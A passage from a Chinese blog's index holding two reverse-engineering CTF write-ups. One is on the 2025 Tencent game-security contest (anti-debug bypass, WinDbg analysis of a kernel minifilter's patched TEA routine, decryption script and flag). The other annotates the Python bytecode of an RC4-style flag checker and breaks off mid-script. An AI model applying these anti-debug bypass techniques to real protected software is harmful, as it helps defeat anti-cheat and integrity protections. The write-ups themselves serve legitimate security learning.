[{"title":"2025腾讯游戏安全技术竞赛-PC客户端安全-初赛（复现）","url":"/2025/04/04/2025%E8%85%BE%E8%AE%AF%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%AB%9E%E8%B5%9B-PC%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%AE%89%E5%85%A8-%E5%88%9D%E8%B5%9B/","content":"复现题目旨在了解题目的逻辑~~~~，可能与真正的解题流程有出入\n先看main函数\n首先，加载了ACEDriverSDK，里面有许多函数，我们先标出函数的作用。\n\n在虚表中我们可以看到下面这两个函数，一个是用于后面base58表的初始化的，还有一个就是反调试函数。\n\n根据作用大致恢复一下结构体(命名函数时会自动修改)。\nstruct ACEDriverSDK_vftable&#123;  void *creat_vftable;  __int64 (__fastcall *initserver)(ACEDriverSDK_vftable **a1, char *a2, __int64 a3);  __int64 (__fastcall *closeserver)(ACEDriverSDK_vftable **a1, __int64 a2);  _BOOL8 (__fastcall *startserver)(ACEDriverSDK_vftable **a1, SC_HANDLE hSCManager, const WCHAR *lpServiceName);  SC_HANDLE (__fastcall *openserver)(ACEDriverSDK_vftable **a1, SC_HANDLE hSCManager, const WCHAR *lpServiceName);  __int64 (__fastcall *Filter_install)(ACEDriverSDK_vftable **a1, SC_HANDLE hSCManager, const WCHAR *lpServiceName, const WCHAR *lpBinaryPathName);  __int64 (__fastcall *deleteserver)(ACEDriverSDK_vftable **a1, SC_HANDLE hSCManager, const WCHAR *lpServiceName);  HRESULT (__fastcall *FilterConnectCommunicationPort_wrp)(ACEDriverSDK_vftable **a1);  __int64 (__fastcall *FilterSendMessaged)(ACEDriverSDK_vftable **a1, int a2, const void *a3, unsigned int Size_1, LPVOID lpOutBuffer, DWORD dwOutBufferSize, DWORD *a7);  void *regDriverFunc_;  int (__fastcall *CloseHandled)(ACEDriverSDK_vftable ***a1);  __int64 (__fastcall *send_test)(ACEDriverSDK_vftable **a1);  __int64 (__fastcall *send_message)(ACEDriverSDK_vftable **a1, unsigned int Size, const void *a3);&#125;;\n\n这里我们主要注意一下initserver，Filter_install，FilterConnectCommunicationPort_wrp，FilterSendMessaged，send_test，send_message。其他的函数也都是字面意思。\n\ninitserver函数注册并启动驱动服务，同时初始化了Windows 文件系统过滤驱动（File System Filter Driver）。\n\nFilterConnectCommunicationPort_wrp()创建了一个端口用于用户层和内核层的通信。\nFilterSendMessaged，send_test，send_message函数把信息发送给内核层。其中send_test发送了一个测试信息，”This is TestHello from r3”。\n接下来我们继续分析main函数。\nregDriverFunc_(sdk)加载sdk，加载驱动后，题目要求我们输入flag，并下下面规定了flag前四位为”ACE_“。\n\n接下来用异或的方式获取了一个密钥。下面还有一个类似strcpy函数把获取的key赋值到了Block中。后面把我们的输入放到了base58enc_and_re()函数处理。\n\nbase58加密特征，output是表，看一下引用，是来自一个虚表的函数初始化的，到时候我们动调获得就行。\n\n在末尾还有一个_std_reverse_trivially_swappable_1(v44, v45)会把结果反转(后续调试得来，看名字也可以知道)。\n\n接下来把base58enc_and_re()处理的结果与上面得到的异或密钥进行异或加密，并把加密结果存入res中。\n\n与把数据发送给内核，进行flag的check。\n\n大概逻辑清晰了，接下来动调获取数据。发现有反调试，推测是在main函数前加载，对main交叉引用可以找到__scrt_common_main_seh()函数。在虚表中我们可以看到反调试函数。\n\n在反调试函数中我们能够看到checkdebug()函数被传入beginthreadex()创建了一个反调试的线程，把线程信息保存到了全局变量&amp;byte_7FF7F4D78C40中。\n\n仔细查看checkdebug()函数能够发现调用了CheckRemoteDebuggerPresent()进行调试检测。同时通过Query_perf_frequency()函数获取CPU的时钟频率，调用QueryPerformanceCounter()精确计算程序运行的时间，如果程序的运行时间超过预定时间8.64e14s就会terminate()终止进程。\n\n绕过反调试，我们只需要在函数里修改一下让函数直接返回就行。还可以用frida把checkdebug函数替换掉，这样才遵守了不修改原程序的规则。不过为了分析，我们先把函数ret掉。\n\n去掉反调试后发现程序在调试的时候会直接闪退在驱动加载阶段。推测在驱动内还有反调试的检测，于是我们直接跳过驱动的加载先分析r3层，毕竟只有在最后checkflag的时候才需要用到驱动。\n\n在base58函数里面拿到表\n\nbase58\n\n倒转\n\n异或”sxx”\n\n发送到内核check\n\n现在来分析驱动，我们先来了解一下在这题中r3与r0的通信方式。\n查找我们发现的那些通信函数，我们可以发现，本题采用的通信方式是minifilter的port端口通信。参考这篇文章[内核驱动] miniFilter 内核层与应用程序通信，和mapiFltCreateCommunicationPort 函数 （fltkernel.h） - Windows drivers | Microsoft Learn。\n在驱动中，首先要在DriverEntry中用FltRegisterFilter函数进行注册，通过FltCreateCommunicationPort创建一个交互端口，并创建3个回调函数分别在连接，关闭连接，接收消息时调用，我们需要重点关注消息接收函数的作用。\n由于混淆的不是特别强烈，在函数表中我们就能看到FltRegisterFilter函数，交叉引用过去，我们就能看到minifilter的初始化函数\n\n我们主要看一下MessageNotifyCallback。里面有一些混淆，大概就是以一对push和pop为一组混淆或者花指令。去掉混淆和花指令。没有看到明显加密特征，继续跟函数调用。\n发现sub_1400021C0里面有一堆_mm_stream_ps系统调用，看着像系统函数，（这里可以通过windbg动调给输入的数据下硬件断点找到数据被操作的位置）猜测是memcpy()，继续往下看可以看到一个被混淆的函数sub_140001448，跟进去看看。进去后在第一个call的函数里call了一个地址为0x140001000的函数，看到有加密特征，去一下花指令，恢复函数，可以看到一个tea加密以及密钥。加密后对密文进行了比较，所以这里就是最后的加密逻辑，把两个一字节数据传入加密。对tea交叉引用可以发现有一个函数对tea进行了动态修补。而且还不清楚输入数据是否是没有修改的被传递传递到这里来的，打算采用动调的方式解决。\n\n用windbg动调，先找到基地址我这里是0xfffff803&#96;31db0000\n\n找到位置基地址+1000就是tea加密函数的位置，直接在0xfffff803&#96;31db1000处下断点后输入”ACE_1111111”运行到这里，在ida上看到，加密传进来的数据在rcx，密钥在rdx，直接查看内存就可以发现。左边两位”3”,”&#x3D;”是要加密的输入，’’A,C,E,6’就是key。那么逻辑的确就是把r3层传入的数据按两个字节为一组进行加密。\n\n但是tea函数被动态patch了，打算动调拿出patch之后函数的字节码。\n\n从刚刚的断点往下看，现在这就是已经被patch掉的函数了。往下分析，\n\n发现中间多出一个jmp跳转到l0x0FFFFB98A61565000，跟进去看看\n\n发现执行完这一段后又会跳转回原来的加密函数，看一下跳转的地址我们就可以发现。第一个jmp是直接跳转到了原来加密函数的末尾，也就是加密结束。第二个jmp跳转到了加密函数前面的位置执行下一轮加密。也就是说原来加密函数的后面部分是执行不到的，原函数直接跳转到了0x0FFFFB98A61565000执行。如下面的汇编\nfffff803`31db1000 488bc4               mov     rax, rspfffff803`31db1003 48895808             mov     qword ptr [rax+8], rbxfffff803`31db1007 48896810             mov     qword ptr [rax+10h], rbpfffff803`31db100b 48897018             mov     qword ptr [rax+18h], rsifffff803`31db100f 48897820             mov     qword ptr [rax+20h], rdifffff803`31db1013 4155                 push    r13fffff803`31db1015 4c8bea               mov     r13, rdxfffff803`31db1018 8b1a                 mov     ebx, dword ptr [rdx]fffff803`31db101a 4533db               xor     r11d, r11dfffff803`31db101d 8b7a04               mov     edi, dword ptr [rdx+4]fffff803`31db1020 4c8bc1               mov     r8, rcxfffff803`31db1023 8b7208               mov     esi, dword ptr [rdx+8]fffff803`31db1026 8b6a0c               mov     ebp, dword ptr [rdx+0Ch]fffff803`31db1029 448b09               mov     r9d, dword ptr [rcx]fffff803`31db102c 418d5320             lea     edx, [r11+20h]fffff803`31db1030 448b5104             mov     r10d, dword ptr [rcx+4]fffff803`31db1034 418bca               mov     ecx, r10dfffff803`31db1037 458d9bb979379e       lea     r11d, [r11-61C88647h]fffff803`31db103e c1e905               shr     ecx, 5fffff803`31db1041 418bc2               mov     eax, r10dfffff803`31db1044 03cf                 add     ecx, edifffff803`31db1046 c1e004               shl     eax, 4fffff803`31db1049 03c3                 add     eax, ebxfffff803`31db104b 33c8                 xor     ecx, eaxfffff803`31db104d 438d0413             lea     eax, [r11+r10]fffff803`31db1051 33c8                 xor     ecx, eaxfffff803`31db1053 4403c9               add     r9d, ecxfffff803`31db1056 50                   push    raxfffff803`31db1057 48b8005056618ab9ffff mov     rax, 0FFFFB98A61565000hfffff803`31db1061 ffe0                 jmp     rax-----------------------------------------------------------------------------&lt;&lt;fffff803`31db1062 e0cd                 loopne  FFFFF80331DB1031 ;无效部分fffff803`31db1064 03c6                 add     eax, esifffff803`31db1066 33c8                 xor     ecx, eaxfffff803`31db1068 438d040b             lea     eax, [r11+r9]fffff803`31db1069 8d040b               lea     eax, [rbx+rcx]fffff803`31db106a 040b                 add     al, 0Bhfffff803`31db106c 33c8                 xor     ecx, eaxfffff803`31db106e 4403d1               add     r10d, ecxfffff803`31db106f 03d1                 add     edx, ecxfffff803`31db1071 4883ea01             sub     rdx, 1fffff803`31db1072 83ea01               sub     edx, 1fffff803`31db1075 75bd                 jne     FFFFF80331DB1034-----------------------------------------------------------------------------&lt;&lt;fffff803`31db1077 415d                 pop     r13\t;结尾部分fffff803`31db1079 488b5c2408           mov     rbx, qword ptr [rsp+8]fffff803`31db107e 488b6c2410           mov     rbp, qword ptr [rsp+10h]fffff803`31db1083 488b742418           mov     rsi, qword ptr [rsp+18h]fffff803`31db1088 488b7c2420           mov     rdi, qword ptr [rsp+20h]fffff803`31db108d 458908               mov     dword ptr [r8], r9dfffff803`31db1090 45895004             mov    ..........................................................................ffffb98a`61565000 58                   pop     rax\t\t;跳转的函数ffffb98a`61565001 418bc9               mov     ecx, r9dffffb98a`61565004 418bc1               mov     eax, r9dffffb98a`61565007 c1e004               shl     eax, 4ffffb98a`6156500a c1e905               shr     ecx, 5ffffb98a`6156500d 33c8                 xor     ecx, eaxffffb98a`6156500f 418bc3               mov     eax, r11dffffb98a`61565012 48c1e80b             shr     rax, 0Bhffffb98a`61565016 4103c9               add     ecx, r9dffffb98a`61565019 83e003               and     eax, 3ffffb98a`6156501c 418b448500           mov     eax, dword ptr [r13+rax*4]ffffb98a`61565021 4103c3               add     eax, r11dffffb98a`61565024 33c8                 xor     ecx, eaxffffb98a`61565026 4403d1               add     r10d, ecxffffb98a`61565029 4883ea01             sub     rdx, 1ffffb98a`6156502d 48b87710db3103f8ffff mov     rax, 0FFFFF80331DB1077hffffb98a`61565037 48b93410db3103f8ffff mov     rcx, 0FFFFF80331DB1034hffffb98a`61565041 7502                 jne     FFFFB98A61565045ffffb98a`61565043 ffe0                 jmp     rax \t;结束加密ffffb98a`61565045 ffe1                 jmp     rcx\t;下一轮加密\n\n我们到对应的地址去把对应的十六进制dump下来，删掉中间的无效部分，直接进行拼接。拼接完成后保存为文件，用ida打开，修复一下跳转地址就可以看到伪代码。\nasm = [72, 139, 196, 72, 137, 88, 8, 72, 137, 104, 16, 72, 137, 112, 24, 72, 137, 120, 32, 65, 85, 76, 139, 234, 139, 26, 69, 51, 219, 139, 122, 4, 76, 139, 193, 139, 114, 8, 139, 106, 12, 68, 139, 9, 65, 141, 83, 32, 68, 139, 81, 4, 65, 139, 202, 69, 141, 155, 185, 121, 55, 158, 193, 233, 5, 65, 139, 194, 3, 207, 193, 224, 4, 3, 195, 51, 200, 67, 141, 4, 19, 51, 200, 68, 3, 201, 144, 65, 139, 201, 65, 139, 193, 193, 224, 4, 193, 233, 5, 51, 200, 65, 139, 195, 72, 193, 232, 11, 65, 3, 201, 131, 224, 3, 65, 139, 68, 133, 0, 65, 3, 195, 51, 200, 68, 3, 209, 72, 131, 234, 1, 72, 199, 192, 119, 0, 0, 0, 144, 144, 144, 72, 199, 193, 52, 0, 0, 0, 144, 144, 144, 117, 2, 255, 224, 255, 225, 65, 93, 72, 139, 92, 36, 8, 72, 139, 108, 36, 16, 72, 139, 116, 36, 24, 72, 139, 124, 36, 32, 69, 137, 8, 69, 137, 80, 4, 195]get = &quot;&quot;for i in asm:    str1 = hex(i)[2::]    if len(str1)&lt;2: str1 = &quot;0&quot;*(2-len(str1)) + str1    get += str1+&quot; &quot;print(get)res = bytes(asm)print(res)f = open(&quot;res&quot;,&quot;wb&quot;)f.write(res)\n\n修复\n\n看伪代码\n\n现在逻辑就很清晰了，就是一个魔改的tea加密，密钥和加密数据是一样的。\n再动调往后看看。\n在加密函数的ret处下断点运行到这里，单步运行返回到0xFFFFF80331B19C5B处，紧接着的就是一个比较函数，的确这就是最后的加密了。\n\n发现数据来源是rsi-4也就是0xFFFFF80331B14064 - 4，而且每次比较完后都会把rsi+8，也就是2个四字节数据为一组进行比较。查看所在内存，把密文提取出来（当然也可以静态提取密文）。\n\nB8 67 C3 0E 44 90 DA C9 EB 2D 6C DA C3 C9 DD 8875 15 A0 32 B4 D0 1D 23 74 8A 9E 4B 74 3E 5D D712 87 AB EA 88 E8 04 E7 AC 31 1A E0 5C 20 AE EC67 74 BE A7 A3 52 62 0C 4E EC EF 1A 44 ED 0D C4CC 42 C8 C3 0E 0C 4A DE FC F3 24 7C 01 D0 B8 8F6E 3E 15 11 5C D1 0E 53 11 48 21 F4 E0 17 B5 BE34 16 F9 63 A5 F8 96 4D C8 EA 23 FE DF 7A 60 2C5C D8 43 CC 5B 6C 18 FF A5 E1 63 87 58 BD 87 919B 06 D1 87 7B 8D 87 D7 68 6B 6E 83 3F C6 A0 55B3 FD 79 D9 EE 4D 52 3E 82 5C B3 7A 8D DA F4 A24C BA 08 17 E6 53 06 71 。。。\n\n解密方式有两种，一是写常规解密脚本。二是爆破，因为他每次只对两字节加密，进行比较，我们爆破这两个字节也很容易得到结果。\n下面是解密脚本，base58也可以用赛博厨师解密，记得去掉”@”。\n#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;#include &quot;base58.h&quot;__int64 __fastcall detea( int* key, unsigned int* a4)&#123;    unsigned int sum; // r11d    unsigned int b0; // r9d    __int64 n32; // rdx    unsigned int b1; // r10d    sum = 0;    b0 = *a4;    n32 = 32;    b1 = a4[1];    uint32_t delta = 0x61C88647;\tsum = delta * 32*-1;    do    &#123;        b1 -= (sum + key[(sum &gt;&gt; 11) &amp; 3]) ^ (b0 + ((16 * b0) ^ (b0 &gt;&gt; 5)));        b0 -= (sum + b1) ^ (*key + 16 * b1) ^ (key[1] + (b1 &gt;&gt; 5));                sum += delta;        --n32;    &#125; while (n32);    *a4 = b0;    a4[1] = b1;    return 0;&#125;int main() &#123;    int key[4] = &#123; 0x41, 0x43, 0x45, 0x36 &#125;;    uint32_t m[] = &#123; 0x0EC367B8, 0xC9DA9044, 0xDA6C2DEB, 0x88DDC9C3, 0x32A01575, 0x231DD0B4, 0x4B9E8A74, 0xD75D3E74,    0xEAAB8712, 0xE704E888, 0xE01A31AC, 0xECAE205C, 0xA7BE7467, 0x0C6252A3, 0x1AEFEC4E, 0xC40DED44,    0xC3C842CC, 0xDE4A0C0E, 0x7C24F3FC, 0x8FB8D001, 0x11153E6E, 0x530ED15C, 0xF4214811, 0xBEB517E0,    0x63F91634, 0x4D96F8A5, 0xFE23EAC8, 0x2C607ADF, 0xCC43D85C, 0xFF186C5B, 0x8763E1A5, 0x9187BD58,    0x87D1069B, 0xD7878D7B, 0x836E6B68, 0x55A0C63F, 0xD979FDB3, 0x3E524DEE, 0x7AB35C82, 0xA2F4DA8D,    0x1708BA4C, 0x710653E6 &#125;;    uint32_t xorkey[] = &#123;&#x27;s&#x27;,&#x27;x&#x27;,&#x27;x&#x27;&#125;;\tunsigned char m2[42];        for (int i = 0; i &lt; 42; i += 2) detea(key, m + i);\tfor (int i = 0; i &lt; 42; i++) m[i] ^= xorkey[i % 3];    int c = 0;    for (int i = 41; i &gt;= 1; i--) m2[c++] = m[i]; //反转并去除&#x27;@&#x27;\tm2[41] = &#x27;\\0&#x27;;\tde_base58(m2);     printf(&quot;%s&quot;, m2);\treturn 0;&#125;//We1C0me!T0Z0Z5GamESecur1t9*CTf\n\n","categories":["WriteUp"],"tags":["re,WriteUp"]},{"title":"2024浙江省省赛 Re-wp+复现","url":"/2024/11/10/2024%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B/","content":"(・∀・)つ原题(提取码: d9sa)\n初赛ezre一个python字节码文件，可以用pycdas查看字节码。我们借此来分析一下python字节码文件的结构。\n涉及到闭包函数的内容，总的来说闭包就是函数被定义在了函数里面。\n闭包，看这一篇就够了——带你看透闭包的本质，百发百中-CSDN博客\nezRe (Python 3.9)[Code]    File Name: flag_checker.py    #文件信息    Object Name: &lt;module&gt;        #表示这是模块的主代码（即文件的最外层代码，不是函数或类）。    Arg Count: 0                 #表示模块没有参数。    Pos Only Arg Count: 0\t\t#表示没有仅限位置参数。    KW Only Arg Count: 0\t\t#表示没有仅限关键字参数。    Locals: 0\t\t\t\t   #表示模块中没有局部变量。    Stack Size: 7\t\t\t\t#栈大小    Flags: 0x00000040 (CO_NOFREE) #标志位，CO_NOFREE表示这段代码没有自由变量（即没有闭包）。    [Names]\t\t\t\t#全局变量、函数和模块的名称列表。        &#x27;base64&#x27;        &#x27;input&#x27;        &#x27;text&#x27;        &#x27;key&#x27;        &#x27;list&#x27;        &#x27;range&#x27;        &#x27;s&#x27;        &#x27;j&#x27;        &#x27;i&#x27;        &#x27;len&#x27;        &#x27;data&#x27;        &#x27;_&#x27;        &#x27;append&#x27;        &#x27;result&#x27;        &#x27;zip&#x27;        &#x27;c&#x27;        &#x27;k&#x27;        &#x27;chr&#x27;        &#x27;ord&#x27;        &#x27;b64encode&#x27;        &#x27;encode&#x27;        &#x27;decode&#x27;        &#x27;enc&#x27;        &#x27;print&#x27;    [Var Names]   \t\t#模块中的局部变量    [Free Vars]\t\t\t#自由变量    [Cell Vars]\t\t\t#闭包变量    [Constants]\t\t\t#常量池        0        None        &#x27;Flag: &#x27;        &#x27;7e021a7dd49e4bd0837e22129682551b&#x27;  #密钥        [Code]\t\t\t#嵌套代码对象，类似list(ord(i) for i in range(102)),本质就是一个列表所以会显示为常量。同时python也会把这个封装为一个隐式函数，后面调用的时候以函数形式调用            File Name: flag_checker.py  #属于的文件            Object Name: &lt;listcomp&gt;     #对象的名字，列表推导式            Arg Count: 1 #有一个参数            Pos Only Arg Count: 0  #下面的同上            KW Only Arg Count: 0            Locals: 2            Stack Size: 4            Flags: 0x00000043 (CO_OPTIMIZED | CO_NEWLOCALS | CO_NOFREE)            [Names]                &#x27;ord&#x27;            [Var Names]                &#x27;.0&#x27;                &#x27;i&#x27;            [Free Vars]            [Cell Vars]            [Constants]                102            [Disassembly]\t\t\t#字节码指令                0       BUILD_LIST                    0 \t#建立一个列表对象                2       LOAD_FAST                     0: .0  #加载参数                4       FOR_ITER                      16 (to 22)\t#迭代器迭代对象                6       STORE_FAST                    1: i\t#存储到i                8       LOAD_GLOBAL                   0: ord\t#加载函数名称                10      LOAD_FAST                     1: i\t\t#加载变量                12      CALL_FUNCTION                 1\t\t\t#调用函数                14      LOAD_CONST                    0: 102\t#加载常量                16      BINARY_XOR\t\t\t\t\t\t\t  #异或操作，现在栈顶的两个值是i和102                18      LIST_APPEND                   2\t\t\t#追加结果到列表中，列表保存到栈顶                20      JUMP_ABSOLUTE                 4\t\t\t#返回，继续迭代                22      RETURN_VALUE\t\t\t\t\t\t   #返回栈顶值，即列表        &#x27;&lt;listcomp&gt;&#x27;\t\t#列表推导式的名称(函数名)        256        50        1        &#x27;&#x27;        51        &#x27;w53Cj3HDgzTCsSM5wrg6FMKcw58Qw7RZSFLCljRxwrxbwrVdw4AEwqMjw7/DkMKTw4/Cv8Onw4NGw7jDmSdcwq4GGg==&#x27; #密文        &#x27;yes!&#x27;        &#x27;try again...&#x27;    [Disassembly]\t\t#字节操作码，        0       LOAD_CONST                    0: 0        2       LOAD_CONST                    1: None\t#加载常量        4       JUMP_FORWARD                  0 (to 6)\t#跳转到6        6       JUMP_FORWARD                  0 (to 8)        8       JUMP_FORWARD                  0 (to 10)        10      IMPORT_NAME                   0: base64\t\t#导入模块        12      STORE_NAME                    0: base64        14      LOAD_NAME                     1: input\t\t#获取输入        16      LOAD_CONST                    2: &#x27;Flag: &#x27;        18      CALL_FUNCTION                 1\t\t\t\t#调用input函数        20      STORE_NAME                    2: text\t\t#存储到text        22      LOAD_CONST                    3: &#x27;7e021a7dd49e4bd0837e22129682551b&#x27;\t#加载密钥        24      STORE_NAME                    3: key\t#存储到key        26      LOAD_CONST                    4: &lt;CODE&gt; &lt;listcomp&gt; #加载列表递推式代码        28      LOAD_CONST                    5: &#x27;&lt;listcomp&gt;&#x27;\t#加载常量，列表递推式的名字        30      MAKE_FUNCTION                 0\t\t\t\t\t#以创建函数形式了列表递推式对象        32      LOAD_NAME                     3: key\t\t\t#加载key        34      GET_ITER\t\t\t\t\t\t\t\t\t#迭代器，迭代对象key        36      CALL_FUNCTION                 1\t\t\t\t\t#调用列表递推式，key被作为迭代对象传入        38      STORE_NAME                    3: key\t\t\t#保存返回结果到key        40      LOAD_NAME                     4: list\t\t\t#获取函数名list        42      LOAD_NAME                     5: range\t\t\t#获取函数名range        44      LOAD_CONST                    6: 256\t\t\t#获取range的值        46      CALL_FUNCTION                 1\t\t\t\t\t#调用函数range        48      CALL_FUNCTION                 1\t\t\t\t\t#调用函数list        50      STORE_NAME                    6: s\t\t\t\t#把列表存储到s中，s为一个ASCII码表        52      LOAD_CONST                    0: 0\t\t\t\t#加载0        54      STORE_NAME                    7: j\t\t\t\t#把0赋值给j        56      LOAD_NAME                     5: range\t\t\t        58      LOAD_CONST                    6: 256        60      CALL_FUNCTION                 1\t\t\t\t\t#调用函数range(256)        62      GET_ITER\t\t\t\t\t\t\t\t\t  #以range(256)为对象        64      FOR_ITER                      62 (to 128)\t\t#开始迭代，如果迭代完毕，跳转到128        66      STORE_NAME                    8: i\t\t\t\t#存储迭代的数据        68      LOAD_NAME                     7: j        70      LOAD_NAME                     6: s        72      LOAD_NAME                     8: i        74      BINARY_SUBSCR\t\t\t\t\t\t\t\t  #下标操作，s[i]        76      BINARY_ADD\t\t\t\t\t\t\t\t\t  #栈顶2个数据相加，这里为s[i]+j        78      LOAD_NAME                     3: key        80      LOAD_NAME                     8: i        82      LOAD_NAME                     9: len        84      LOAD_NAME                     3: key\t\t\t#调用函数len(key)        86      CALL_FUNCTION                 1        88      BINARY_MODULO\t\t\t\t\t\t\t\t   #对栈顶的两个元素取余，这里是i%len(key)        90      BINARY_SUBSCR\t\t\t\t\t\t\t#下标操作，现在栈顶为key和i%len(key),即为key[i%len(key)]        92      BINARY_ADD\t\t\t\t\t\t\t\t#栈顶两个相加，现在是s[i]+j+key[i%len(key)]        94      LOAD_CONST                    6: 256        96      BINARY_MODULO\t\t\t\t\t\t\t#对栈顶两个元素取余，现在是(s[i]+j+key[i%len(key)])%256        98      STORE_NAME                    7: j\t\t  #保存结果到j中        100     LOAD_NAME                     6: s        102     LOAD_NAME                     7: j        104     BINARY_SUBSCR\t\t\t\t\t\t\t#下标操作s[j]        106     LOAD_NAME                     6: s        108     LOAD_NAME                     8: i        110     BINARY_SUBSCR\t\t\t\t\t\t\t#下标操作s[i]        112     ROT_TWO\t\t\t\t\t\t\t\t\t#交换栈顶两个元素        114     LOAD_NAME                     6: s        116     LOAD_NAME                     8: i        118     STORE_SUBSCR\t\t\t\t\t\t\t#赋值栈顶元素到s[i]        120     LOAD_NAME                     6: s        122     LOAD_NAME                     7: j        124     STORE_SUBSCR\t\t\t\t\t\t\t#赋值栈顶元素到s[j]，这两步就是交换下标        126     JUMP_ABSOLUTE                 64\t\t  #迭代继续，跳转回开始位置        128     LOAD_CONST                    0: 0        130     DUP_TOP\t\t\t\t\t\t\t\t\t#复制一遍栈顶的值，这里为0        132     STORE_NAME                    8: i        134     STORE_NAME                    7: j          #把栈顶的值复制给i和j，这里是两个0        136     BUILD_LIST                    0\t\t\t\t        138     STORE_NAME                    10: data\t\t##建立列表data        140     LOAD_NAME                     5: range        142     LOAD_CONST                    7: 50        144     CALL_FUNCTION                 1        146     GET_ITER        148     FOR_ITER                      88 (to 238) #对range(50)进行迭代        150     STORE_NAME                    11: _  \t  #迭代值放入_        152     LOAD_NAME                     8: i        154     LOAD_CONST                    8: 1        156     BINARY_ADD\t\t\t\t\t\t\t\t#i+1        158     LOAD_CONST                    6: 256        160     BINARY_MODULO\t\t\t\t\t\t\t#(i+1)%256        162     STORE_NAME                    8: i\t\t  #i=(i+1)%256        164     LOAD_NAME                     7: j        166     LOAD_NAME                     6: s        168     LOAD_NAME                     8: i        170     BINARY_SUBSCR\t\t\t\t\t\t\t#s[i]        172     BINARY_ADD\t\t\t\t\t\t\t\t#s[i]+j        174     LOAD_CONST                    6: 256        176     BINARY_MODULO\t\t\t\t\t\t\t#(s[i]+j)%256        178     STORE_NAME                    7: j\t\t  #j = (s[i]+j)%256        180     LOAD_NAME                     6: s        182     LOAD_NAME                     7: j        184     BINARY_SUBSCR\t\t\t\t\t\t\t#s[j]        186     LOAD_NAME                     6: s        188     LOAD_NAME                     8: i        190     BINARY_SUBSCR\t\t\t\t\t\t\t#s[i]        192     ROT_TWO        194     LOAD_NAME                     6: s        196     LOAD_NAME                     8: i        198     STORE_SUBSCR        200     LOAD_NAME                     6: s        202     LOAD_NAME                     7: j        204     STORE_SUBSCR\t\t\t\t\t\t\t#交换s[i]和s[j]        206     LOAD_NAME                     10: data        208     LOAD_METHOD                   12: append        210     LOAD_NAME                     6: s        212     LOAD_NAME                     6: s        214     LOAD_NAME                     8: i        216     BINARY_SUBSCR\t\t\t\t\t\t\t#s[i]        218     LOAD_NAME                     6: s        220     LOAD_NAME                     7: j        222     BINARY_SUBSCR\t\t\t\t\t\t\t#s[j]        224     BINARY_ADD\t\t\t\t\t\t\t\t#s[i]+s[j]        226     LOAD_CONST                    6: 256\t           228     BINARY_MODULO\t\t\t\t\t\t\t#(s[i]+s[j])%256        230     BINARY_SUBSCR\t\t\t\t\t\t\t#s[(s[i]+s[j])%256]        232     CALL_METHOD                   1\t\t\t  #data.append(s[(s[i]+s[j])%256])        234     POP_TOP\t\t\t\t\t\t\t\t\t#清理栈顶        236     JUMP_ABSOLUTE                 148\t\t  #继续迭代        238     LOAD_CONST                    9: &#x27;&#x27;        240     STORE_NAME                    13: result\t#定义空字符串result        242     LOAD_NAME                     14: zip        244     LOAD_NAME                     2: text        246     LOAD_NAME                     10: data        248     CALL_FUNCTION                 2\t\t\t\t#调用zip函数有两个参数，就是text和data,放回一个元组，把数据成对成列表放在元组中，例如[(text[0],data[0]),(text[1],data[1]),...]        250     GET_ITER        252     FOR_ITER                      32 (to 286)\t#对元组进行迭代        254     UNPACK_SEQUENCE               2\t\t\t\t#解包，提示赋值2个变量        256     STORE_NAME                    15: c\t\t\t#赋值数据给c,k        258     STORE_NAME                    16: k        260     LOAD_NAME                     13: result        262     LOAD_NAME                     17: chr        264     LOAD_NAME                     18: ord        266     LOAD_NAME                     15: c        268     CALL_FUNCTION                 1\t\t\t\t#ord(c)        270     LOAD_NAME                     16: k        272     BINARY_XOR\t\t\t\t\t\t\t\t  #ord(c) ^ k        274     LOAD_CONST                    10: 51        276     BINARY_XOR\t\t\t\t\t\t\t\t   #ord(c) ^ k ^51        278     CALL_FUNCTION                 1\t\t\t\t #chr(ord(c) ^ k ^51)        280     INPLACE_ADD\t\t\t\t\t\t\t\t   #result + chr(ord(c) ^ k ^51)        282     STORE_NAME                    13: result  \t  #result = result        284     JUMP_ABSOLUTE                 252\t\t\t  #继续迭代        286     LOAD_NAME                     0: base64        288     LOAD_METHOD                   19: b64encode        290     LOAD_NAME                     13: result        292     LOAD_METHOD                   20: encode        294     CALL_METHOD                   0\t\t\t\t#result.encode        296     CALL_METHOD                   1\t\t\t\t#base64.b64encode(result.encode)        298     LOAD_METHOD                   21: decode        300     CALL_METHOD                   0\t\t\t\t#base64.b64encode(result.encode).decode        302     STORE_NAME                    22: enc        304     LOAD_NAME                     22: enc        306     LOAD_CONST                    11: &#x27;w53Cj3HDgzTCsSM5wrg6FMKcw58Qw7RZSFLCljRxwrxbwrVdw4AEwqMjw7/DkMKTw4/Cv8Onw4NGw7jDmSdcwq4GGg==&#x27;        308     COMPARE_OP                    2 (==) #判断enc是否等于上面的base64.b64encode(result.encode).decode        310     POP_JUMP_IF_FALSE             324        314     LOAD_NAME                     23: print        316     LOAD_CONST                    12: &#x27;yes!&#x27;        318     CALL_FUNCTION                 1        320     POP_TOP        322     JUMP_FORWARD                  8 (to 332)        324     LOAD_NAME                     23: print        326     LOAD_CONST                    13: &#x27;try again...&#x27;        328     CALL_FUNCTION                 1        330     POP_TOP        332     LOAD_CONST                    1: None        334     RETURN_VALUE\n\n上面代码的加密解密脚本\nimport base64def enc():    text = input(&quot;flag:&quot;)    key = &quot;7e021a7dd49e4bd0837e22129682551b&quot;    key = list(ord(i) ^ 102 for i in key)    s = list(range(256))    j = 0    for i in range(256):        j = (s[i] + j + key[i % len(key)]) % 256        tmp = s[i]        s[i] = s[j]        s[j] = tmp    i = j = 0    data = list()    for _ in range(50):        i = (i + 1) % 256        j = (s[i] + j) % 256        tmp = s[i]        s[i] = s[j]        s[j] = tmp        data.append(s[(s[i] + s[j]) % 256])    result = &quot;&quot;    for c, k in zip(text, data):        result += chr(ord(c) ^ k ^ 51)    result = base64.b64encode(result.encode()).decode()    enc = &#x27;w53Cj3HDgzTCsSM5wrg6FMKcw58Qw7RZSFLCljRxwrxbwrVdw4AEwqMjw7/DkMKTw4/Cv8Onw4NGw7jDmSdcwq4GGg==&#x27;    if result == enc:        print(&quot;yes!&quot;)    else:        print(&quot;try again...&quot;)def dec():    enc = &#x27;w53Cj3HDgzTCsSM5wrg6FMKcw58Qw7RZSFLCljRxwrxbwrVdw4AEwqMjw7/DkMKTw4/Cv8Onw4NGw7jDmSdcwq4GGg==&#x27;    key = &quot;7e021a7dd49e4bd0837e22129682551b&quot;    text = 